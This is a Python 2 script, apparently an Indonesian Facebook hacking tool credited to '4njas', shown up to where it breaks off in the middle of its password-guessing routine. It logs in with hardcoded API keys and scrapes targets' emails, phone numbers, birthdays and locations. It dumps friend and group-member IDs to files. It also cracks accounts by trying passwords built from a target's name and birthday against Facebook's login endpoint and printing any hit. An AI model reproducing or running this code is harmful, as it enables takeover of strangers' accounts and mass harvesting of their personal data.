import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/36.2.2254/119.132; U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91m[!] Exit'
    os.sys.exit()


def keluar():
    print '\x1b[1;97m[!] \x1b[1;91mExit\x1b[1;97m'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.05)


logo = "\n                                           \x1b[1;93m\x1b[1;95m\x1b[1;92m\n\n\n'||''|.                   '||      '                 \n ||   ||   ....   ... ..   ||  ..    .. .. ..    /\\  \n ||    || '' .||   ||' ''  || .'      || || ||  (  ) \n ||    || .|' ||   ||      ||'|.      || || ||    // \x1b[31;1m\n.||...|'  '|..'|' .||.    .||. ||.   .|| || ||.  //  \n                                                /(   \n                                                {___ \n             \x1b[0;1m                                   \n  Author   :  4njas\n  Type     :  Dark-M2\n  Version  :  0.1  \n  Thanks   :  BL4CK DR460N\n  Thanks To All Members Woll Cyber                                                                                            \n      "

def lisensi():
    os.system('clear')
    print logo
    print 'Tools Ini membutuhkan Lisensi'
    print
    lisen = raw_input('\x1b[33m[?] \x1b[37mLISENSI : \x1b[32m')
    if lisen < 5:
        print '\x1b[31m[-] Lisensi Salah Gan :v'
        raw_input('\x1b[34m[?] Enter Untuk Mengulang')
        lisensi()
    elif lisen == 'anjas210':
        print '\x1b[32m[+] Lisensi Benar'
        time.sleep(5)
    elif lisen == 'bl4ckdr460n':
        print '\x1b[32m[+] Lisensi Benar'
        time.sleep(5)
    else:
        print '\x1b[31m[-] Lisensi Salah Gan :v'
        raw_input('\x1b[34m[?] Enter Untuk Mengulang')
        lisensi()


def tik():
    titik = ['...']
    for o in titik:
        print '[!]Sedang login. Mohon tunggu \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def notice():
    h = '\x1b[92m'
    k = '\x1b[93m'
    m = '\x1b[91m'
    p = '\x1b[0m'
    from getpass import getpass as oh
    import os
    os.system('clear')
    print m + '\t\t[Warning]\n' + p
    print 'Memakai tool bisa membuat akun anda\ncheckpoint atau yg paling parah dibanned.\n'
    print 'Silahkan konfirmasi indentitas dahulu\nsebelum memakai tool ini. Segala risiko\nditanggung user. Hiya Hiya Hiya :v\n'
    oh('[Tekan Enter Untuk Lanjut]')
    login()


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '[+]Login To Your Account\n'
        print '\x1b[1;93m------------------------'
        id = raw_input('[+]ID/Email : ')
        pwd = raw_input('[+]Password : ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                anjas = open('login.txt', 'w')
                anjas.write(z['access_token'])
                anjas.close()
                print 'Login Berhasil\n'
                os.system('')
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;96m[!] \x1b[1;91mSepertinya akun anda kena checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;96m[!] \x1b[1;91mPassword/Email salah'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
        except KeyError:
            os.system('clear')
            print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;96m[!] \x1b[1;91mTidak ada koneksi'
            keluar()

    os.system('clear')
    print logo
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;97m Name \x1b[1;91m: \x1b[1;92m' + nama + '\x1b[1;97m'
    print 42 * '\x1b[1;97m\xe2\x95\x90'
    print ' \n'
    print '[ 1 ].Information '
    print '[ 2 ].Dumps '
    print '[ 3 ].Crack Acount '
    print '[ 4 ].Yahoo Clone '
    print '[ 5 ].list Group '
    print '[ 6 ].Frofile Shild '
    print '[ 0 ].logOut '
    pilih()


def pilih():
    anjas = raw_input('\n\x1b[1;97m\x1b[91m[chouse]\x1b[1;97m')
    if anjas == '':
        print '\x1b[1;96m[!] \x1b[1;91mPilih yang bnr Anjg'
        pilih()
    elif anjas == '1':
        informasi()
    elif anjas == '2':
        dump()
    elif anjas == '3':
        menu_hack()
    elif anjas == '4':
        yahoo()
    elif anjas == '5':
        grupsaya()
    elif anjas == '6':
        guard()
    elif anjas == '7':
        self()
    elif anjas == '0':
        os.system('clear')
        jalan('Menghapus token')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print '\x1b[1;96m[!] \x1b[1;91mIsi yang benar'
        pilih()


def informasi():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print 42 * '\x1b[1;96m='
    aid = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID/Nama\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mTunggu sebentar \x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for i in cok['data']:
        if aid in i['name'] or aid in i['id']:
            x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
            z = json.loads(x.text)
            print 43 * '\x1b[1;96m='
            try:
                print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mNama\x1b[1;97m          : ' + z['name']
            except KeyError:
                print '\x1b[1;96m[?] \x1b[1;93mNama\x1b[1;97m          : \x1b[1;91mTidak ada'
            else:
                try:
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mID\x1b[1;97m            : ' + z['id']
                except KeyError:
                    print '\x1b[1;96m[?] \x1b[1;93mID\x1b[1;97m            : \x1b[1;91mTidak ada'
                else:
                    try:
                        print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mEmail\x1b[1;97m         : ' + z['email']
                    except KeyError:
                        print '\x1b[1;96m[?] \x1b[1;93mEmail\x1b[1;97m         : \x1b[1;91mTidak ada'
                    else:
                        try:
                            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mNo HP\x1b[1;97m         : ' + z['mobile_phone']
                        except KeyError:
                            print '\x1b[1;96m[?] \x1b[1;93mNo HP\x1b[1;97m         : \x1b[1;91mTidak ada'

                        try:
                            print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mTempat tinggal\x1b[1;97m: ' + z['location']['name']
                        except KeyError:
                            print '\x1b[1;96m[?] \x1b[1;93mTempat tinggal\x1b[1;97m: \x1b[1;91mTidak ada'

                    try:
                        print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mTanggal lahir\x1b[1;97m : ' + z['birthday']
                    except KeyError:
                        print '\x1b[1;96m[?] \x1b[1;93mTanggal lahir\x1b[1;97m : \x1b[1;91mTidak ada'

                try:
                    print '\x1b[1;96m[\xe2\x9e\xb9] \x1b[1;93mSekolah\x1b[1;97m       : '
                    for q in z['education']:
                        try:
                            print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                        except KeyError:
                            print '\x1b[1;91m                   ~ \x1b[1;91mTidak ada'

                except KeyError:
                    pass

            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()
    else:
        print '\x1b[1;96m[\xe2\x9c\x96] \x1b[1;91mAkun tidak ditemukan'
        raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
        menu()


def dump():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('reset')
    print logo
    print '1.\x1b[1;97m Get ID friend'
    print '2.\x1b[1;97m Get ID friend from friend'
    print '3.\x1b[1;97m Get group member ID'
    print '0. Exit '
    dump_pilih()


def dump_pilih():
    cuih = raw_input('\x1b[1;91m>>> \x1b[1;97m')
    if cuih == '':
        print '\x1b[1;91m[!] Wrong input'
        dump_pilih()
    elif cuih == '1':
        id_teman()
    elif cuih == '2':
        idfrom_teman()
    elif cuih == '3':
        id_member_grup()
    elif cuih == '4':
        em_member_grup()
    elif cuih == '5':
        no_member_grup()
    elif cuih == '6':
        email()
    elif cuih == '7':
        emailfrom_teman()
    elif cuih == '8':
        nomor_hp()
    elif cuih == '9':
        hpfrom_teman()
    elif cuih == '0':
        menu()
    else:
        print '\x1b[1;91m[!] Wrong input'
        dump_pilih()


def id_teman():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            os.system('reset')
            print logo
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet list Friend \x1b[1;97m...')
            print 42 * '\x1b[1;97m\xe2\x95\x90'
            bz = open('out/id_teman.txt', 'w')
            for a in z['data']:
                idteman.append(a['id'])
                bz.write(a['id'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
                sys.stdout.flush()
                time.sleep(0.0001)

            bz.close()
            print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSuccessfully get id \x1b[1;97m....'
            print '\r\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m%s' % len(idteman)
            done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file with name\x1b[1;91m :\x1b[1;97m ')
            os.rename('out/id_teman.txt', 'out/' + done)
            print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()
        except IOError:
            print '\x1b[1;91m[!] Error creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()
        except KeyError:
            print '\x1b[1;91m[!] Error'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            menu()


def idfrom_teman():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            os.system('reset')
            print logo
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID friend \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Friend not found'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                dump()

            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
            z = json.loads(r.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all friend id from friend \x1b[1;97m...')
            print 42 * '\x1b[1;97m\xe2\x95\x90'
            bz = open('out/id_teman_from_teman.txt', 'w')
            for a in z['friends']['data']:
                idfromteman.append(a['id'])
                bz.write(a['id'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idfromteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
                sys.stdout.flush()
                time.sleep(0.0001)

            bz.close()
            print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSuccessfully get id \x1b[1;97m....'
            print '\r\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m%s' % len(idfromteman)
            done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file with name\x1b[1;91m :\x1b[1;97m ')
            os.rename('out/id_teman_from_teman.txt', 'out/' + done)
            print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()
        except IOError:
            print '\x1b[1;91m[!] Error creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()
        except KeyError:
            print '\x1b[1;91m[!] Error'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            menu()


def id_member_grup():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            os.system('reset')
            print logo
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID group \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom group \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[1;91m[!] Group not found'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                dump()

            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet group member id \x1b[1;97m...')
            print 42 * '\x1b[1;97m\xe2\x95\x90'
            bz = open('out/member_grup.txt', 'w')
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999999&access_token=' + toket)
            s = json.loads(re.text)
            for a in s['data']:
                idmem.append(a['id'])
                bz.write(a['id'] + '\n')
                print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idmem)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m' + a['id'],
                sys.stdout.flush()
                time.sleep(0.0001)

            bz.close()
            print '\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mSuccessfully get id \x1b[1;97m....'
            print '\r\x1b[1;91m[+] \x1b[1;92mTotal ID \x1b[1;91m: \x1b[1;97m%s' % len(idmem)
            done = raw_input('\r\x1b[1;91m[+] \x1b[1;92mSave file with name\x1b[1;91m :\x1b[1;97m ')
            os.rename('out/member_grup.txt', 'out/' + done)
            print '\r\x1b[1;91m[+] \x1b[1;92mFile saved \x1b[1;91m: \x1b[1;97mout/' + done
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()
        except IOError:
            print '\x1b[1;91m[!] Error creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()
        except KeyError:
            print '\x1b[1;91m[!] Error'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            dump()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            menu()


def menu_hack():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('reset')
    print logo
    print '[ 1 ].Crack Acount target '
    print '[ 2 ].Multi Bruteforce '
    print '[ 3 ].Super Multi crack '
    print '[ 0 ].Back\n'
    hack_pilih()


def hack_pilih():
    hack = raw_input('\x1b[1;97m>>>')
    if hack == '':
        print '\x1b[1;91m[!] Wrong input'
        hack_pilih()
    elif hack == '1':
        mini()
    elif hack == '2':
        crack()
        hasil()
    elif hack == '3':
        super()
    elif hack == '4':
        brute()
    elif hack == '5':
        menu_yahoo()
    elif hack == '0':
        menu()
    else:
        print '\x1b[1;91m[!] Wrong input'
        hack_pilih()


def mini():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        os.system('reset')
        print logo
        print ' Not 100% Work '
        print 42 * '\x1b[1;97m\xe2\x95\x90'
        try:
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mTarget ID \x1b[1;91m:\x1b[1;97m ')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
            a = json.loads(r.text)
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m : ' + a['name']
            jalan('\x1b[1;91m[+] \x1b[1;92mCheck \x1b[1;97m...')
            time.sleep(2)
            jalan('\x1b[1;91m[+] \x1b[1;92mOpen password \x1b[1;97m...')
            time.sleep(2)
            print 42 * '\x1b[1;97m\xe2\x95\x90'
            pz1 = a['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '\x1b[1;91m[+] \x1b[1;92mFound'
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                menu_hack()
            elif 'www.facebook.com' in y['error_msg']:
                print '\x1b[1;91m[+] \x1b[1;92mFound'
                print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                menu_hack()
            else:
                pz2 = a['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                y = json.load(data)
                if 'access_token' in y:
                    print '\x1b[1;91m[+] \x1b[1;92mFound'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                    menu_hack()
                elif 'www.facebook.com' in y['error_msg']:
                    print '\x1b[1;91m[+] \x1b[1;92mFound'
                    print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                    menu_hack()
                else:
                    pz3 = a['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[1;91m[+] \x1b[1;92mFound'
                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                        menu_hack()
                    elif 'www.facebook.com' in y['error_msg']:
                        print '\x1b[1;91m[+] \x1b[1;92mFound'
                        print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                        menu_hack()
                    else:
                        lahir = a['birthday']
                        pz4 = lahir.replace('/', '')
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        y = json.load(data)
                        if 'access_token' in y:
                            print '\x1b[1;91m[+] \x1b[1;92mFound'
                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                            menu_hack()
                        elif 'www.facebook.com' in y['error_msg']:
                            print '\x1b[1;91m[+] \x1b[1;92mFound'
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                            menu_hack()
                        else:
                            lahirs = a['birthday']
                            gaz = lahirs.replace('/', '')
                            pz5 = a['first_name'] + gaz
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[1;91m[+] \x1b[1;92mFound'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                menu_hack()
                            elif 'www.facebook.com' in y['error_msg']:
                                print '\x1b[1;91m[+] \x1b[1;92mFound'
                                print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz5
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                menu_hack()
                            else:
                                pz6 = 'sayang'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                y = json.load(data)
                                if 'access_token' in y:
                                    print '\x1b[1;91m[+] \x1b[1;92mFound'
                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz6
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                    menu_hack()
                                elif 'www.facebook.com' in y['error_msg']:
                                    print '\x1b[1;91m[+] \x1b[1;92mFound'
                                    print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName\x1b[1;97m     : ' + a['name']
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
